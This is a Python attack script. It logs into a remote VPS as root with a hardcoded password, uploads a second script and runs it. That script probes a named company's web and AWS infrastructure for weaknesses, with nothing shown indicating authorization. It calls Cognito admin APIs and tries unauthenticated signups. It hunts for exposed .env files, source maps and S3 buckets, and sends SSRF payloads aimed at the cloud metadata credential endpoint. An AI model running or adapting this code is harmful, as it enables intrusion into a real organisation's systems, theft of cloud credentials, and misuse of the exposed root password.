"""EVERY non-spray vector against Disperso from VPS."""
import paramiko, textwrap

VPS = "64.177.88.10"
PW = r"5F.jyTK$D6%.F{a="

REMOTE = textwrap.dedent(r'''
import json, urllib.request, urllib.error, ssl, socket, sys, time

ctx = ssl._create_unverified_context()
BASE = "https://rdrrxexkm4.execute-api.us-east-2.amazonaws.com"
COGNITO = "https://cognito-idp.us-east-2.amazonaws.com/"
CLIENT = "4fjbm9cornhgfqk4o8m33rjt2f"
POOL = "us-east-2_SOCtEIx2s"

def req(url, data=None, headers=None, method=None, timeout=15):
    hdrs = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    if headers:
        hdrs.update(headers)
    if isinstance(data, dict):
        data = json.dumps(data).encode()
    r = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        resp = urllib.request.urlopen(r, timeout=timeout, context=ctx)
        body = resp.read()
        return resp.status, body, dict(resp.headers)
    except urllib.error.HTTPError as e:
        body = e.read()
        return e.code, body, dict(e.headers)
    except Exception as e:
        return 0, str(e).encode(), {}

def cognito_req(target, body):
    return req(COGNITO, data=body, headers={
        "Content-Type": "application/x-amz-json-1.1",
        "X-Amz-Target": f"AWSCognitoIdentityProviderService.{target}"
    })

# ======================================================
print("=" * 60)
print("1. COGNITO SIGNUP VARIATIONS")
print("=" * 60)

# Basic - no custom attrs
for uname in ["probe1@yopmail.com", "76543210-9"]:
    s, b, h = cognito_req("SignUp", {
        "ClientId": CLIENT, "Username": uname,
        "Password": "Disp2026!Reg",
        "UserAttributes": [{"Name":"email","Value":"probe1@yopmail.com"}]
    })
    print(f"  SignUp {uname}: {s} {b[:200]}")
    time.sleep(0.5)

# With phone
s, b, h = cognito_req("SignUp", {
    "ClientId": CLIENT, "Username": "probe2@yopmail.com",
    "Password": "Disp2026!Reg",
    "UserAttributes": [
        {"Name":"email","Value":"probe2@yopmail.com"},
        {"Name":"phone_number","Value":"+56912345678"}
    ]
})
print(f"  SignUp+phone: {s} {b[:200]}")

# ======================================================
print("\n" + "=" * 60)
print("2. COGNITO IDENTITY POOL (unauth AWS creds)")
print("=" * 60)

# Try to find identity pool via common patterns
for pool_id in [
    f"us-east-2:{POOL.split('_')[1]}",
    "us-east-2:disperso",
]:
    s, b, h = req(
        "https://cognito-identity.us-east-2.amazonaws.com/",
        data={"IdentityPoolId": pool_id},
        headers={
            "Content-Type": "application/x-amz-json-1.1",
            "X-Amz-Target": "AWSCognitoIdentityService.GetId"
        }
    )
    print(f"  GetId {pool_id}: {s} {b[:200]}")
    time.sleep(0.3)

# ======================================================
print("\n" + "=" * 60)
print("3. API GATEWAY OTHER STAGES (dev/test/staging/v2)")
print("=" * 60)

for stage in ["dev", "test", "staging", "v2", "sandbox", "qa", ""]:
    url = f"https://rdrrxexkm4.execute-api.us-east-2.amazonaws.com/{stage}/api/v1/bank"
    s, b, h = req(url)
    tag = "***" if s not in (403, 0) else ""
    print(f"  {tag} /{stage}/api/v1/bank -> {s} ({len(b)}b)")
    time.sleep(0.3)

# ======================================================
print("\n" + "=" * 60)
print("4. SOURCE MAPS")
print("=" * 60)

for path in [
    "https://app.disperso.com/assets/index.js.map",
    "https://app.disperso.com/assets/index.css.map",
    "https://app.disperso.com/sourcemaps/",
    "https://app.disperso.com/.env",
    "https://app.disperso.com/.env.production",
    "https://app.disperso.com/config.json",
    "https://app.disperso.com/env.js",
    "https://app.disperso.com/runtime-env.js",
    "https://app.disperso.com/aws-exports.js",
    "https://app.disperso.com/amplifyconfiguration.json",
]:
    s, b, h = req(path)
    tag = "!!!" if s == 200 and len(b) > 100 else ""
    print(f"  {tag} {path.split('.com')[1]} -> {s} ({len(b)}b)")
    if s == 200 and len(b) > 50 and len(b) < 5000:
        print(f"      BODY: {b[:500]}")
    time.sleep(0.3)

# ======================================================
print("\n" + "=" * 60)
print("5. WEBPACK CHUNKS / LAZY ROUTES")
print("=" * 60)

# First get the index.html to find chunk names
s, b, h = req("https://app.disperso.com/")
html = b.decode(errors="replace")
import re
scripts = re.findall(r'src="(/assets/[^"]+)"', html)
print(f"  Scripts in index.html: {scripts}")

# Try common chunk patterns
for chunk in ["vendor", "admin", "config", "auth", "login", "register", "signup"]:
    for ext in [".js", ".js.map"]:
        url = f"https://app.disperso.com/assets/{chunk}{ext}"
        s2, b2, h2 = req(url, method="HEAD")
        if s2 != 404:
            print(f"  {url.split('.com')[1]} -> {s2} ({h2.get('content-length','?')}b)")
        time.sleep(0.2)

# ======================================================
print("\n" + "=" * 60)
print("6. S3 BUCKET LISTING + REGION VARIANTS")
print("=" * 60)

buckets = [
    "disperso-prod", "disperso-dev", "disperso-uploads", "disperso-documents",
    "disperso-files", "disperso-staging", "disperso-backups", "disperso-assets",
    "disperso-app", "disperso-static", "disperso-public", "disperso-data",
    "tuxpan-disperso", "disperso-payment", "disperso-payment-orders",
]
for b_name in buckets:
    for tpl in [f"https://{b_name}.s3.amazonaws.com/", f"https://{b_name}.s3.us-east-2.amazonaws.com/"]:
        s, b, h = req(tpl)
        if s != 404 and s != 0:
            print(f"  {tpl} -> {s} ({len(b)}b)")
            if s == 200:
                print(f"      BODY: {b[:500]}")
            elif b"AccessDenied" in b:
                print(f"      EXISTS (AccessDenied)")
            elif b"NoSuchBucket" in b:
                pass  # skip
            else:
                print(f"      {b[:200]}")
        time.sleep(0.2)

# ======================================================
print("\n" + "=" * 60)
print("7. SOPORTE PUBLIC ENDPOINTS (ticket, chat, feedback)")
print("=" * 60)

SOP = "https://soporte.disperso.com"
# Try public ticket creation without auth
payloads = [
    ("POST", f"{SOP}/api/public/ticket", {"subject":"test","description":"test","email":"probe@yopmail.com","name":"Test User"}),
    ("POST", f"{SOP}/api/public/tickets", {"subject":"test","description":"test","email":"probe@yopmail.com"}),
    ("POST", f"{SOP}/api/public/contact", {"email":"probe@yopmail.com","message":"test"}),
    ("POST", f"{SOP}/api/public/chat", {"message":"test","email":"probe@yopmail.com"}),
    ("POST", f"{SOP}/api/public/feedback", {"rating":5,"comment":"test"}),
    ("POST", f"{SOP}/api/public/message", {"content":"test","email":"probe@yopmail.com"}),
    ("GET",  f"{SOP}/api/public/config", None),
    ("GET",  f"{SOP}/api/public/health", None),
    ("GET",  f"{SOP}/api/public/version", None),
    ("GET",  f"{SOP}/api/public/settings", None),
    ("GET",  f"{SOP}/health", None),
    ("GET",  f"{SOP}/api/health", None),
    ("GET",  f"{SOP}/actuator/health", None),
    ("GET",  f"{SOP}/robots.txt", None),
    ("GET",  f"{SOP}/sitemap.xml", None),
    ("GET",  f"{SOP}/.well-known/openid-configuration", None),
    ("GET",  f"{SOP}/swagger-ui.html", None),
    ("GET",  f"{SOP}/swagger-ui/index.html", None),
    ("GET",  f"{SOP}/v3/api-docs", None),
]
for method, url, body in payloads:
    s, b, h = req(url, data=body if body else None,
                  headers={"Content-Type":"application/json"} if body else None,
                  method=method)
    if s not in (404, 405):
        path = url.replace(SOP, "")
        print(f"  {method} {path} -> {s} ({len(b)}b)")
        if s in (200, 201, 500) and b:
            print(f"      {b[:300]}")
    time.sleep(0.3)

# ======================================================
print("\n" + "=" * 60)
print("8. LANDING disperso.com FORMS + HIDDEN PATHS")
print("=" * 60)

LAND = "https://disperso.com"
for path in [
    "/robots.txt", "/sitemap.xml", "/.well-known/security.txt",
    "/api/", "/api/v1/", "/wp-json/", "/graphql",
    "/contactanos/demo", "/contacto", "/demo",
    "/_next/", "/.env", "/config.json",
]:
    s, b, h = req(f"{LAND}{path}")
    if s not in (0,):
        print(f"  {path} -> {s} ({len(b)}b) {h.get('content-type','')[:40]}")
        if s == 200 and len(b) < 3000 and ("json" in h.get("content-type","") or "xml" in h.get("content-type","") or "text/plain" in h.get("content-type","")):
            print(f"      {b[:500]}")
    time.sleep(0.3)

# ======================================================
print("\n" + "=" * 60)
print("9. NOTIFICATION SSRF / REDIRECT / DEEP")
print("=" * 60)

# The notification endpoint returns 200 for any JSON. Test SSRF/redirect payloads.
NP = f"{BASE}/prod/api/v1/notification"
ssrf_payloads = [
    {"url": "http://169.254.169.254/latest/meta-data/"},
    {"callback": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
    {"webhook": "http://127.0.0.1:8080/api/v1/user/me"},
    {"redirect": "http://127.0.0.1:3000"},
    {"email":"admin@disperso.com","name":"Test","company":"TestCo","phone":"1234567890","message":"Demo request","source":"api"},
    {"type":"new-potential-client","data":{"email":"probe@yopmail.com","name":"Probe","company":"ProbeInc","phone":"+56912345678","message":"Interested in API","country":"CL"}},
]
for i, p in enumerate(ssrf_payloads):
    s, b, h = req(NP, data=p, headers={"Content-Type":"application/json"})
    tag = "!!!" if (s == 200 and len(b) > 0) or s not in (200, 403) else ""
    print(f"  {tag} notif#{i} -> {s} ({len(b)}b) {b[:200] if len(b)>0 else '(empty)'}")
    time.sleep(0.5)

# ======================================================
print("\n" + "=" * 60)
print("10. COGNITO ADVANCED (AdminGetUser, GetUser, ListUsers)")
print("=" * 60)

targets = [
    ("GetUser", {"AccessToken": "dummy"}),
    ("AdminGetUser", {"UserPoolId": POOL, "Username": "admin@disperso.com"}),
    ("AdminCreateUser", {"UserPoolId": POOL, "Username": "probe@yopmail.com", "TemporaryPassword": "Temp2026!", "UserAttributes": [{"Name":"email","Value":"probe@yopmail.com"}]}),
    ("ListUsers", {"UserPoolId": POOL, "Limit": 1}),
    ("DescribeUserPool", {"UserPoolId": POOL}),
    ("GetUserPoolMfaConfig", {"UserPoolId": POOL}),
    ("ListUserPoolClients", {"UserPoolId": POOL}),
    ("DescribeUserPoolClient", {"UserPoolId": POOL, "ClientId": CLIENT}),
    ("ListIdentityProviders", {"UserPoolId": POOL, "MaxResults": 5}),
    ("ListUserImportJobs", {"UserPoolId": POOL, "MaxResults": 1}),
    ("ConfirmSignUp", {"ClientId": CLIENT, "Username": "probe@yopmail.com", "ConfirmationCode": "000000"}),
    ("ResendConfirmationCode", {"ClientId": CLIENT, "Username": "probe@yopmail.com"}),
    ("InitiateAuth", {"AuthFlow": "USER_PASSWORD_AUTH", "ClientId": CLIENT, "AuthParameters": {"USERNAME":"probe@yopmail.com","PASSWORD":"x"}}),
]
for target, body in targets:
    s, b, h = cognito_req(target, body)
    msg = b[:250].decode(errors="replace")
    tag = "!!!" if s in (200,) else "**" if "NotAuthorizedException" not in msg and "InvalidParameter" not in msg else ""
    print(f"  {tag} {target}: {s} {msg}")
    time.sleep(0.3)

# ======================================================
print("\n" + "=" * 60)
print("11. POSTMAN / NPM / PUBLIC DOCS")
print("=" * 60)

urls = [
    "https://www.postman.com/search?q=disperso&type=all",
    "https://registry.npmjs.org/-/v1/search?text=disperso&size=5",
    "https://api.npms.io/v2/search?q=disperso&size=5",
]
for url in urls:
    s, b, h = req(url)
    if s == 200:
        try:
            d = json.loads(b)
            total = d.get("total", d.get("results", []))
            print(f"  {url.split('?')[0].split('/')[-1]} -> {s} total={total if isinstance(total,int) else len(total)}")
            if isinstance(total, list):
                for r in total[:3]:
                    print(f"      {r}")
        except:
            print(f"  {url.split('?')[0]} -> {s} ({len(b)}b)")
    time.sleep(0.5)

# ======================================================
print("\n" + "=" * 60)
print("12. WAYBACK CDX (old snapshots)")
print("=" * 60)

for domain in ["app.disperso.com", "api.disperso.com", "disperso.com"]:
    cdx = f"https://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&limit=15&fl=timestamp,original,statuscode,mimetype"
    s, b, h = req(cdx, timeout=20)
    if s == 200:
        try:
            rows = json.loads(b)
            print(f"  {domain}: {len(rows)-1} snapshots")
            for row in rows[1:]:
                print(f"    {row[0]} {row[1]} {row[2]} {row[3]}")
        except:
            print(f"  {domain}: {s} parse error")
    else:
        print(f"  {domain}: {s}")
    time.sleep(1)

print("\n" + "=" * 60)
print("DONE")
print("=" * 60)
''')

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(VPS, username="root", password=PW, timeout=15)
print(f"Connected {VPS}")
sftp = ssh.open_sftp()
with sftp.file("/tmp/todo.py", "w") as f:
    f.write(REMOTE)
sftp.close()
print("Uploaded. Running...")
stdin, stdout, stderr = ssh.exec_command("python3 /tmp/todo.py 2>&1", timeout=180)
out = stdout.read().decode(errors="replace")
print(out)
err = stderr.read().decode(errors="replace")
if err.strip():
    print("STDERR:", err[:500])
ssh.close()
